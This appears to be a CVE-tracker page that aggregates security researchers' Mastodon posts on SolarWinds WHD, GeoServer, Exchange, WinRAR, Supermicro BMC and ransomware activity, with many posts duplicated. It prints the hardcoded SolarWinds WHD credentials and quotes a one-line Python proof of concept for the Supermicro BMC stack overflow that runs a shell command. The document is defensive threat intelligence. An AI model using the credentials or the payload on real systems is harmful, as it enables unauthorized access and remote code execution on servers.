Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

CVE-2024-5932
(10.0 CRITICAL)

EPSS: 72.36%

updated 2024-08-20T03:32:30

2 posts

The GiveWP – Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to dele

🔍 Asynchronous report generation
👀 Detectors for CVE-2024-5932 (RCE in GiveWP Donation Plugin) & CVE-2023-43770 (XSS in RoundCube)
🎯 Exploits for CVE-2024-5932 & CVE-2022-20707 (Cisco RV Series RCE & auth bypass), RCE in Zyxel, RCE in Apache OFBiz, and more
🕷️ Detection for insecure deserialization in .Net apps
📄 Bulk clone findings in one click

screaminggoat at 2024-09-25T11:47:09.581Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

updated 2024-08-14T17:01:08.027000

4 posts

screaminggoat at 2024-09-22T18:27:46.904Z ##

@ntkramer Can you haphazard a guess as to why there's a sudden uptick of exploitation attempts? I don't know if if CVE-2023-4966 #CitrixBleed is automatable.

CVE-2023-4966 is known to be used in ransomware campaigns: Lockbit reported 21 November 2023: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a

Additional resources:

  • security advisory: https://support.citrix.com/s/article/CTX579459-netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967?language=en_US
  • Netscaler recommendations: https://www.netscaler.com/blog/news/netscaler-investigation-recommendations-for-cve-2023-4966/
  • Mandiant investigation includes Yara rule: https://cloud.google.com/blog/topics/threat-intelligence/session-hijacking-citrix-cve-2023-4966/
  • Unit 42 threat brief: https://unit42.paloaltonetworks.com/threat-brief-cve-2023-4966-netscaler-citrix-bleed/
  • DHS malware analysis report from CitrixBleed security incidents: https://www.cisa.gov/news-events/analysis-reports/ar23-325a
##
ntkramer at 2024-09-22T17:36:37.410Z ##

🗞️ & #threatintel: Increased interest in IPs attempting to exploit CVE-2023-4966, an unauthenticated information disclosure vulnerability in Citrix ADC & NetScaler platforms.

https://viz.greynoise.io/tags/citrix-adc-netscaler-cve-2023-4966-information-disclosure-attempt?days=30

##
screaminggoat@infosec.exchange at 2024-09-22T18:27:46.000Z ##

@ntkramer Can you haphazard a guess as to why there's a sudden uptick of exploitation attempts? I don't know if if CVE-2023-4966 #CitrixBleed is automatable.

CVE-2023-4966 is known to be used in ransomware campaigns: Lockbit reported 21 November 2023: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a

Additional resources:

  • security advisory: https://support.citrix.com/s/article/CTX579459-netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967?language=en_US
  • Netscaler recommendations: https://www.netscaler.com/blog/news/netscaler-investigation-recommendations-for-cve-2023-4966/
  • Mandiant investigation includes Yara rule: https://cloud.google.com/blog/topics/threat-intelligence/session-hijacking-citrix-cve-2023-4966/
  • Unit 42 threat brief: https://unit42.paloaltonetworks.com/threat-brief-cve-2023-4966-netscaler-citrix-bleed/
  • DHS malware analysis report from CitrixBleed security incidents: https://www.cisa.gov/news-events/analysis-reports/ar23-325a

CVE-2023-38831
(7.8 HIGH)

EPSS: 40.85%

updated 2024-08-14T15:28:44.603000

2 posts

RARLAB WinRAR before 6.23 allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive. The issue occurs because a ZIP archive may include a benign file (such as an ordinary .JPG file) and also a folder that has the same name as the benign file, and the contents of the folder (which may include executable content) are processed during an attempt to acc

screaminggoat at 2024-09-25T13:54:00.393Z ##

Cloudflare: Unraveling SloppyLemming’s Operations Across South Asia
Reference: CVE-2023-38831 (7.8 high, disclosed 23 August 2023 by Group-IB as an exploited zero-day, added to CISA's KEV Catalog 24 August 2023, has proof of concept) RARLAB WinRAR Code Execution Vulnerability

Cloudflare reports that an APT dubbed SloppyLemming (aka India-nexus Outrider Tiger) used multiple cloud service providers between late 2022 to present for ongoing cyber espionage operations targeting Pakistan, Sri Lanka, Bangladesh, and China. Industries targeted include government, law enforcement, energy, telecommunications, and technology entities. SloppyLemming displays a lack of operational security (OPSEC) allowing Cloudforce One insight into its tooling. The actor primarily targets Pakistani government, defense, telecommunications, technology, and energy sector organizations; SloppyLemming also targets Bangladesh, Sri Lanka, Nepal, and China.

Cloudflare describes SloppyLemming, that their phishing activity focuses on credential and token collection. They describe malware operations (which leverages CVE-2023-38831) and a separate infection chain. While Cloudflare helpfully provides PowerShell hunting scripts, Microsoft Sentinel rule, and a Splunk script, they put the indicators of compromise (including SHA256 hashes) into an IMAGE! If Cloudflare had their own threat actor name, it’d be SloppyCTI.

See related Security Week reporting: India-Linked Hackers Targeting Pakistani Government, Law Enforcement

#threatintel #SloppyLemming #OutriderTiger #IOC #CTI #cyberthreatintelligence #infosec #CVE_2023_38831 #vulnerability #eitw #cyberespionage #India #cybersecurity

##
screaminggoat@infosec.exchange at 2024-09-25T13:54:00.000Z ##

Cloudflare reports that an APT dubbed SloppyLemming (aka India-nexus Outrider Tiger) used multiple cloud service providers between late 2022 to present for ongoing cyber espionage operations targeting Pakistan, Sri Lanka, Bangladesh, and China. Industries targeted include government, law enforcement, energy, telecommunications, and technology entities. SloppyLemming displays a lack of operational security (OPSEC) allowing Cloudforce One insight into its tooling. The actor primarily targets Pakistani government, defense, telecommunications, technology, and energy sector organizations; SloppyLemming also targets Bangladesh, Sri Lanka, Nepal, and China.

Cloudflare describes SloppyLemming, that their phishing activity focuses on credential and token collection. They describe malware operations (which leverages CVE-2023-38831) and a separate infection chain. While Cloudflare helpfully provides PowerShell hunting scripts, Microsoft Sentinel rule, and a Splunk script, they put the indicators of compromise (including SHA256 hashes) into an IMAGE! ##

CVE-2024-34750
(7.5 HIGH)

EPSS: 0.04%

updated 2024-08-04T05:01:04

1 posts

Improper Handling of Exceptional Conditions, Uncontrolled Resource Consumption vulnerability in Apache Tomcat. When processing an HTTP/2 stream, Tomcat did not handle some cases of excessive HTTP headers correctly. This led to a miscounting of active HTTP/2 streams which in turn led to the use of an incorrect infinite timeout which allowed connections to remain open which should have been closed.

Product: HugeGraph-Server

screaminggoat@infosec.exchange at 2024-09-18T14:09:44.000Z ##

CISA: CISA Adds Five Known Vulnerabilities to Catalog
This is so hot off the press that CISA's press team hasn't created the page yet. 5 are being added to the KEV:

  • CVE-2020-14644 (9.8 critical) Oracle WebLogic Server Remote Code Execution Vulnerability
  • CVE-2022-21445 (9.8 critical) Oracle JDeveloper Remote Code Execution Vulnerability
  • CVE-2019-1069 (7.8 high) Microsoft Windows Task Scheduler Privilege Escalation Vulnerability
  • CVE-2020-0618 (8.8 high) Microsoft SQL Server Reporting Services Remote Code Execution Vulnerability
  • CVE-2024-27348 (9.8 critical) Apache HugeGraph-Server Improper Access Control Vulnerability

#Cisa #KEV #vulnerability #knownexploitedvulnerabilitiescatalog #CVE #eitw #activeexploitation

##

CVE-2024-36435
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-08-01T15:31:55

3 posts

An issue was discovered on Supermicro BMC firmware in select X11, X12, H12, B12, X13, H13, and B13 motherboards (and CMM6 modules). An unauthenticated user can post crafted data to the interface that triggers a stack buffer overflow, and may lead to arbitrary remote code execution on a BMC.

LukaszOlejnik@mastodon.social at 2024-09-28T05:01:53.000Z ##

Proof of concept of a vulnerability in the BMC controller, allowing remote code execution in the server room. requests.post(‘https://192.168.10.53:443/cgi/login.cgi’, data=f ‘name={base64.b64encode(b’\x00‘ * 456 + (0x7628F874).to_bytes(4, “little”) + b’\x00‘ * 12 + (0x762864D4).to_bytes(4, “little”) + b’\x00' * 4 + (0x762936D4). to_bytes(4, ‘little’) + b'touch /tmp/BRLY‘).decode()}&pwd=&check=1’, verify=False) https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##
Tinolle at 2024-09-27T19:12:25.667Z ##

CVE-2024-36435 Deep-Dive: The Year’s Most Critical BMC Security Flaw
https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##
LukaszOlejnik@mastodon.social at 2024-09-28T05:01:53.000Z ##

Proof of concept of a vulnerability in the BMC controller, allowing remote code execution in the server room. requests.post(‘https://192.168.10.53:443/cgi/login.cgi’, data=f ‘name={base64.b64encode(b’\x00‘ * 456 + (0x7628F874).to_bytes(4, “little”) + b’\x00‘ * 12 + (0x762864D4).to_bytes(4, “little”) + b’\x00' * 4 + (0x762936D4). to_bytes(4, ‘little’) + b'touch /tmp/BRLY‘).decode()}&pwd=&check=1’, verify=False) https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

CVE-2024-36401
(9.8 CRITICAL)

EPSS: 95.88%

updated 2024-07-16T01:00:01.567000

6 posts

GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.23.6, 2.24.4, and 2.25.2, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The GeoTools library API that GeoServ

breachhq at 2024-09-26T14:15:06.292Z ##

🚨#DataBreach🚨
In September 2024, the Chinese APT group known as Earth Baxia targeted a government organization in Taiwan and other entities within the Asia-Pacific region by exploiting a Remote Code Execution (RCE) vulnerability in GeoServer (CVE-2024-36401). This flaw, caused by unsafe evaluation of property names as XPath expressions, has a CVSS score of 9.8 and affects GeoServer versions prior to 2.23.6, 2.24.4, and 2.25.2.

The thr...
https://breach-hq.com/breaches/taiwan/2024-sep

##
jodygarnett@fosstodon.org at 2024-09-21T20:34:58.000Z ##

So here is the game. If you see a @geoserver instance, and you can read the version number on the welcome, please ask the admin to read the following post: https://geoserver.org/vulnerability/2024/09/12/cve-2024-36401.html

If you don't see a version number (whew) direct them to https://geoserver.org/behind%20the%20scenes/2024/09/10/gs3.html

There are well over 10k GeoServer’s out there; please help contact them.

#geoserver #foss4g #osgeo

##
flagthis@botsin.space at 2024-09-21T17:01:19.000Z ##

## Earth Baxia Targets Taiwan with Spear-Phishing and GeoServer Exploit

Cybersecurity researchers warn of a coordinated attack leveraging spear-phishing and a GeoServer vulnerability, targeting a Taiwanese government organization and potentially other entities in Asia-Pacific. #Cybersecurity #GeoServer #Taiwan #AsiaPacific

https://securityonline.info/sophisticated-cyber-espionage-earth-baxia-uses-cve-2024-36401-and-cobalt-strike-to-infiltrate-apac/

https://www.flagthis.com/?pid=3982

##
screaminggoat at 2024-09-19T11:27:39.931Z ##

Trend Micro: Earth Baxia Uses Spear-Phishing and GeoServer Exploit to Target APAC
Trend Micro with their silly threat actor naming schema: Earth Baxia is a China-based cyber espionage group. They targeted a government organization in Taiwan, and potentially others in the Asia Pacific (APAC) region using spear-phishing emails and by leveraging CVE-2024-36401 (9.8 critical, disclosed 01 July 2024 by GeoServer, added to CISA KEV 15 July 2024, has proof of concept) OSGeo GeoServer GeoTools Eval Injection Vulnerability. The threat actor employs GrimResource and AppDomainManager injection to deploy additional payloads. Customized Cobalt Strike components were deployed on compromised machines through the two initial access vectors. The altered version of Cobalt Strike included modified internal signatures and a changed configuration structure for evasion. Earth Baxia also used a new backdoor named EAGLEDOOR, which supports multiple communication protocols for information gathering and payload delivery. IOC provided.

#CVE_2024_36401 #EarthBaxia #china #cyberespionage #threatintel #cyberthreatintelligence #CTI #IOC #infosec #cybersecurity #cobaltstrike #geoserver #vulnerability #eitw #activeexploitation #taiwan #apac

##
jodygarnett@fosstodon.org at 2024-09-21T20:34:58.000Z ##

So here is the game. If you see a @geoserver instance, and you can read the version number on the welcome, please ask the admin to read the following post: https://geoserver.org/vulnerability/2024/09/12/cve-2024-36401.html

If you don't see a version number (whew) direct them to https://geoserver.org/behind%20the%20scenes/2024/09/10/gs3.html

There are well over 10k GeoServer’s out there; please help contact them.

#geoserver #foss4g #osgeo

##
screaminggoat@infosec.exchange at 2024-09-19T11:27:39.000Z ##

Trend Micro: Earth Baxia Uses Spear-Phishing and GeoServer Exploit to Target APAC
Trend Micro with their silly threat actor naming schema: Earth Baxia is a China-based cyber espionage group. They targeted a government organization in Taiwan, and potentially others in the Asia Pacific (APAC) region using spear-phishing emails and by leveraging CVE-2024-36401 (9.8 critical, disclosed 01 July 2024 by GeoServer, added to CISA KEV 15 July 2024, has proof of concept) OSGeo GeoServer GeoTools Eval Injection Vulnerability. The threat actor employs GrimResource and AppDomainManager injection to deploy additional payloads. Customized Cobalt Strike components were deployed on compromised machines through the two initial access vectors. The altered version of Cobalt Strike included modified internal signatures and a changed configuration structure for evasion. Earth Baxia also used a new backdoor named EAGLEDOOR, which supports multiple communication protocols for information gathering and payload delivery. IOC provided.

#CVE_2024_36401 #EarthBaxia #china #cyberespionage #threatintel #cyberthreatintelligence #CTI #IOC #infosec #cybersecurity #cobaltstrike #geoserver #vulnerability #eitw #activeexploitation #taiwan #apac

CVE-2024-37893
(5.9 MEDIUM)

EPSS: 0.04%

updated 2024-06-20T12:44:22.977000

1 posts

Firefly III is a free and open source personal finance manager. In affected versions an MFA bypass in the Firefly III OAuth flow may allow malicious users to bypass the MFA-check. This allows malicious users to use password spraying to gain access to Firefly III data using passwords stolen from other sources. As OAuth applications are easily enumerable using an incrementing id, an attacker could t

##

CVE-2023-36777
(5.7 MEDIUM)

EPSS: 0.17%

updated 2024-05-29T03:16:01.830000

2 posts

Microsoft Exchange Server Information Disclosure Vulnerability

screaminggoat at 2024-09-19T18:24:24.278Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 3 – DLL Loading Chain for RCE
This is part 3 in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes 3 vulnerabilities in detail that, when chained together, leads to remote code execution:

  • CVE-2023-36744 (8.0 high, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Arbitrary File Write)
  • CVE-2023-36777 (5.7 medium, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Information Disclosure Vulnerability (described as Arbitrary File Read)
  • CVE-2023-36745 (8.0 high, disclosed 12, September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Local DLL Loading)

TL;DR: CVE-2023-36744 -> Arbitrary File Write through Argument Injection, which drops a malicious DLL to the local file system. The drop path is randomized and initially unknown. CVE-2023-36777 -> Arbitrary File Read, to leak the randomized drop path. CVE-2023-36745 -> Local DLL Loading to load the dropped DLL and achieve RCE as SYSTEM.

#vulnerabilityanalysis #vulnerability #microsoft #exchange #CVE #zdi #proxynotshell #CVE_2023_36745 #CVE_2023_36777 #CVE_2023_36744

##
screaminggoat@infosec.exchange at 2024-09-19T18:24:24.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 3 – DLL Loading Chain for RCE
This is part 3 in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes 3 vulnerabilities in detail that, when chained together, leads to remote code execution:

  • CVE-2023-36744 (8.0 high, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Arbitrary File Write)
  • CVE-2023-36777 (5.7 medium, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Information Disclosure Vulnerability (described as Arbitrary File Read)
  • CVE-2023-36745 (8.0 high, disclosed 12, September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Local DLL Loading)

TL;DR: CVE-2023-36744 -> Arbitrary File Write through Argument Injection, which drops a malicious DLL to the local file system. The drop path is randomized and initially unknown. CVE-2023-36777 -> Arbitrary File Read, to leak the randomized drop path. CVE-2023-36745 -> Local DLL Loading to load the dropped DLL and achieve RCE as SYSTEM.

#vulnerabilityanalysis #vulnerability #microsoft #exchange #CVE #zdi #proxynotshell #CVE_2023_36745 #CVE_2023_36777 #CVE_2023_36744

##

CVE-2023-36756
(8.0 HIGH)

EPSS: 0.07%

updated 2024-05-29T03:15:59.983000

2 posts

Microsoft Exchange Server Remote Code Execution Vulnerability

screaminggoat at 2024-09-26T21:31:11.746Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##
screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##

CVE-2023-36745
(8.0 HIGH)

EPSS: 0.09%

updated 2024-05-29T03:15:59.870000

2 posts

Microsoft Exchange Server Remote Code Execution Vulnerability

1 repos

https://github.com/N1k0la-T/CVE-2023-36745

screaminggoat at 2024-09-19T18:24:24.278Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 3 – DLL Loading Chain for RCE
This is part 3 in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes 3 vulnerabilities in detail that, when chained together, leads to remote code execution:

  • CVE-2023-36744 (8.0 high, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Arbitrary File Write)
  • CVE-2023-36777 (5.7 medium, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Information Disclosure Vulnerability (described as Arbitrary File Read)
  • CVE-2023-36745 (8.0 high, disclosed 12, September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Local DLL Loading)

TL;DR: CVE-2023-36744 -> Arbitrary File Write through Argument Injection, which drops a malicious DLL to the local file system. The drop path is randomized and initially unknown. CVE-2023-36777 -> Arbitrary File Read, to leak the randomized drop path. CVE-2023-36745 -> Local DLL Loading to load the dropped DLL and achieve RCE as SYSTEM.

#vulnerabilityanalysis #vulnerability #microsoft #exchange #CVE #zdi #proxynotshell #CVE_2023_36745 #CVE_2023_36777 #CVE_2023_36744

##
screaminggoat@infosec.exchange at 2024-09-19T18:24:24.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 3 – DLL Loading Chain for RCE
This is part 3 in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes 3 vulnerabilities in detail that, when chained together, leads to remote code execution:

  • CVE-2023-36744 (8.0 high, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Arbitrary File Write)
  • CVE-2023-36777 (5.7 medium, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Information Disclosure Vulnerability (described as Arbitrary File Read)
  • CVE-2023-36745 (8.0 high, disclosed 12, September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Local DLL Loading)

TL;DR: CVE-2023-36744 -> Arbitrary File Write through Argument Injection, which drops a malicious DLL to the local file system. The drop path is randomized and initially unknown. CVE-2023-36777 -> Arbitrary File Read, to leak the randomized drop path. CVE-2023-36745 -> Local DLL Loading to load the dropped DLL and achieve RCE as SYSTEM.

#vulnerabilityanalysis #vulnerability #microsoft #exchange #CVE #zdi #proxynotshell #CVE_2023_36745 #CVE_2023_36777 #CVE_2023_36744

An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC). An attacker who successfully exploited the vulnerability could run a specially crafted application on a device on the network. screaminggoat at 2024-09-20T14:28:15.133Z ##

Trend Micro: How Ransomhub Ransomware Uses EDRKillShifter to Disable EDR and Antivirus Protections
Trend Micro reports that RansomHub actors dubbed "Water Bakunawa" (unknown if they're referring to the RansomHub group itself, or an affiliate since RansomHub is also a Ransomware-as-a-Service) are now using the EDRKillShifter tool to disable endpoint detection and response (EDR) and antivirus protections in their attack chain. They describe infection infection (but give multiple conflicting examples from phishing emails, exploiting internet facing applications with known vulnerabilities, password spraying attacks, and compromised user account, even CVE-2020-1472 (10.0 critical, disclosed 11 August 2020 by Microsoft, in CISA KEV Catalog since inauguration) Netlogon Elevation of Privilege Vulnerability aka ZeroLogon). Trend Micro describes each RansomHub TTP by MITRE technique, and maps to ATT&CK. Indicators of compromise listed.

#threatintel #ransomhub #ransomware #WaterBakunawa #infosec #IOC #CVE_2020_1472 #ZeroLogon #vulnerability #mitreattack #EDRKillShifter #cybersecurity #cyberthreatintelligence #cti #raas

##
screaminggoat@infosec.exchange at 2024-09-20T14:28:15.000Z ##

Trend Micro: How Ransomhub Ransomware Uses EDRKillShifter to Disable EDR and Antivirus Protections
Trend Micro reports that RansomHub actors dubbed "Water Bakunawa" (unknown if they're referring to the RansomHub group itself, or an affiliate since RansomHub is also a Ransomware-as-a-Service) are now using the EDRKillShifter tool to disable endpoint detection and response (EDR) and antivirus protections in their attack chain. They describe infection infection (but give multiple conflicting examples from phishing emails, exploiting internet facing applications with known vulnerabilities, password spraying attacks, and compromised user account, even CVE-2020-1472 (10.0 critical, disclosed 11 August 2020 by Microsoft, in CISA KEV Catalog since inauguration) Netlogon Elevation of Privilege Vulnerability aka ZeroLogon). Trend Micro describes each RansomHub TTP by MITRE technique, and maps to ATT&CK. Indicators of compromise listed.

CVE-2024-3640
(0 None)

EPSS: 0.04%

updated 2024-05-17T18:36:31.297000

2 posts

An unquoted executable path exists in the Rockwell Automation FactoryTalk® Remote Access™ possibly resulting in remote code execution if exploited. While running the FTRA installer package, the executable path is not properly quoted, which could allow a threat actor to enter a malicious executable and run it as a System user. A threat actor needs admin privileges to exploit this vulnerability.

CVE-2023-3852
(7.2 HIGH)

EPSS: 0.63%

updated 2024-05-17T02:27:53.627000

2 posts

A vulnerability was found in OpenRapid RapidCMS up to 1.3.1. It has been declared as critical. This vulnerability affects unknown code of the file /admin/upload.php. The manipulation of the argument file leads to unrestricted upload. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The name of the patch is 4dff387283060961c362d50105ff8da8ea40bcbe.

##

CVE-2022-24805
(6.5 MEDIUM)

EPSS: 0.04%

updated 2024-04-17T12:48:31.863000

2 posts

net-snmp provides various tools relating to the Simple Network Management Protocol. Prior to version 5.9.2, a buffer overflow in the handling of the `INDEX` of `NET-SNMP-VACM-MIB` can cause an out-of-bounds memory access. A user with read-only credentials can exploit the issue. Version 5.9.2 contains a patch. Users should use strong SNMPv3 credentials and avoid sharing the credentials.

screaminggoat at 2024-09-25T16:12:56.029Z ##

Citrix security advisory: XenServer and Citrix Hypervisor Security Update for CVE-2024-45817

  • CVE-2024-45817 (score pending, disclosed today) affects both XenServer 8 and Citrix Hypervisor 8.2 CU1 LTSR: a malicious administrator of a guest VM can cause the host to crash or become unresponsive.
  • CVE-2022-24805 (6.5 medium) net-snmp: A buffer overflow in the handling of the INDEX of NET-SNMP-VACM-MIB can cause an out-of-bounds memory access. affects XenServer 8
  • CVE-2022-24809 (6.5 medium) net-snmp: A malformed OID in a SET request to NET-SNMP-AGENT-MIB::nsLogTable can cause a NULL pointer dereference. Affects XenServer 8

No mention of exploitation. See CISA cybersecurity advisory: Citrix Releases Security Updates for XenServer and Citrix Hypervisor

#Citrix #vulnerability #CVE #CVE_2024_45817 #CVE_2022_24805 #CVE_2022_24809

##
screaminggoat@infosec.exchange at 2024-09-25T16:12:56.000Z ##

  • CVE-2024-45817 (score pending, disclosed today) affects both XenServer 8 and Citrix Hypervisor 8.2 CU1 LTSR: a malicious administrator of a guest VM can cause the host to crash or become unresponsive.
  • CVE-2022-24805 (6.5 medium) net-snmp: A buffer overflow in the handling of the INDEX of NET-SNMP-VACM-MIB can cause an out-of-bounds memory access. affects XenServer 8
  • CVE-2022-24809 (6.5 medium) net-snmp: A malformed OID in a SET request to NET-SNMP-AGENT-MIB::nsLogTable can cause a NULL pointer dereference. Affects XenServer 8

No mention of exploitation. See CISA cybersecurity advisory: Citrix Releases Security Updates for XenServer and Citrix Hypervisor

CVE-2022-24809
(6.5 MEDIUM)

EPSS: 0.04%

updated 2024-04-17T12:48:31.863000

2 posts

net-snmp provides various tools relating to the Simple Network Management Protocol. Prior to version 5.9.2, a user with read-only credentials can use a malformed OID in a `GET-NEXT` to the `nsVacmAccessTable` to cause a NULL pointer dereference. Version 5.9.2 contains a patch. Users should use strong SNMPv3 credentials and avoid sharing the credentials. Those who must use SNMPv1 or SNMPv2c should

screaminggoat at 2024-09-25T16:12:56.029Z ##

  • CVE-2022-24809 (6.5 medium) net-snmp: A malformed OID in a SET request to NET-SNMP-AGENT-MIB::nsLogTable can cause a NULL pointer dereference. Affects XenServer 8

CVE-2024-21338
(7.8 HIGH)

EPSS: 1.43%

updated 2024-04-11T21:30:45

2 posts

Windows Kernel Elevation of Privilege Vulnerability

6 repos

https://github.com/Zombie-Kaiser/CVE-2024-21338-x64-build-

https://github.com/tykawaii98/CVE-2024-21338_PoC

https://github.com/Crowdfense/CVE-2024-21338

https://github.com/UMU618/CVE-2024-21338

https://github.com/varwara/CVE-2024-21338

https://github.com/hakaioffsec/CVE-2024-21338

screaminggoat at 2024-09-23T11:20:50.426Z ##

SentinelOne: Kryptina RaaS | From Unsellable Cast-Off to Enterprise Ransomware
Kryptina is a free and open-source Ransomware-as-a-Service (RaaS) platform written for Linux, previously reported by SentinelOne in February 2024. In May 2024, a Mallox affiliate leaked staging server data, revealing that their Linux ransomware was based on a modified version of Kryptina. The affiliate made superficial changes to source code and documentation, stripping Kryptina branding but retaining core functionality. The adoption of Kryptina by Mallox affiliates exemplifies the commoditization of ransomware tools, complicating malware tracking as affiliates blend different codebases into new variants. SentinelOne provides a brief history of both Kryptina and Mallox, description of Kryptina features and a comparison with the Mallox makefiles.

